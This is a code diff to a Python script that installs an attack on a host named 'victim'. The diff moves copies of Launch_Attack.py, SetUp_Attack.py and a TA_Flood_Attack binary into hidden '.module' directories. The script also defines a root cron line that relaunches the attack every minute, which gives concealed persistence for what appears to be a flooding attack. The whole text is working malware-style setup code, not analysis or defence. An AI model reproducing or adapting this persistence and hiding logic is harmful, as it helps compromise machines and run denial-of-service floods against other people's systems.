@@ -2,7 +2,7 @@ import os
 import sys
 
 
-attackDirs = ['/home/victim/.etc/.module', '/home/victim/.var/.module']
+attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/SetUp_Attack.py', '/TA_Flood_Attack']
 attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'
 
@@ -32,15 +32,15 @@ def set_up_attack():
         os.system('sudo chmod +x TA_Flood_Attack')
         os.system('mkdir {0}'.format(attackDir))
         os.system('mkdir {0}/.module'.format(attackDir))
-        os.system('cp Launch_Attack.py {0}/'.format(attackDir))
-        os.system('cp SetUp_Attack.py {0}/'.format(attackDir))
-        os.system('cp TA_Flood_Attack {0}/'.format(attackDir))
+        os.system('cp Launch_Attack.py {0}/.module/'.format(attackDir))
+        os.system('cp SetUp_Attack.py {0}/.module/'.format(attackDir))
+        os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))
 
 
 def is_set_up_attack():
     for attackDir in attackDirs:
         for attackFile in attackFiles:
-            if not os.path.isfile(attackDir+attackFile):
+            if not os.path.isfile(attackDir + '/.module' + attackFile):
                 return False
 
     return True
